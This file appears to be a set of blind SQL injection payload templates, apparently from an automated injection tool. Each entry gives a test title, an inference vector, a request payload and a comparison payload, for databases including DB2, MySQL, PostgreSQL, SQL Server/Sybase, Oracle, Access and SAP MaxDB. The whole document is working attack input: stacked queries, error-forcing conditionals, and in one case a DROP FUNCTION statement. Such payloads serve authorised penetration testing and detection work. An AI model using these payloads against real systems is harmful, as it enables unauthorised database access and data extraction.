request.payload: ,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)

response.comparison: ,(SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)

test.title: HAVING boolean-based blind - WHERE, GROUP BY clause
test.vector: HAVING [INFERENCE]

request.payload: HAVING [RANDNUM]=[RANDNUM]

response.comparison: HAVING [RANDNUM]=[RANDNUM1]

test.title: MySQL >= 5.0 boolean-based blind - Stacked queries
test.vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)

request.payload: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)

response.comparison: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)

test.title: MySQL < 5.0 boolean-based blind - Stacked queries
test.vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)

request.payload: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)

response.comparison: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)

test.title: PostgreSQL boolean-based blind - Stacked queries
test.vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)

request.payload: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)

response.comparison: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)

test.title: PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)
test.vector: ;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1

request.payload: ;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1

response.comparison: ;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1

test.title: Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)
test.vector: ;IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]

request.payload: ;IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]

response.comparison: ;IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]

test.title: Microsoft SQL Server/Sybase boolean-based blind - Stacked queries
test.vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)

request.payload: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)

response.comparison: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)

test.title: Oracle boolean-based blind - Stacked queries
test.vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL

request.payload: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL

response.comparison: ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL

test.title: Microsoft Access boolean-based blind - Stacked queries
test.vector: ;IIF([INFERENCE],1,1/0)

request.payload: ;IIF([RANDNUM]=[RANDNUM],1,1/0)

response.comparison: ;IIF([RANDNUM]=[RANDNUM1],1,1/0)

test.title: SAP MaxDB boolean-based blind - Stacked queries
test.vector: ;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END

request.payload: ;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END

response.comparison: ;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END
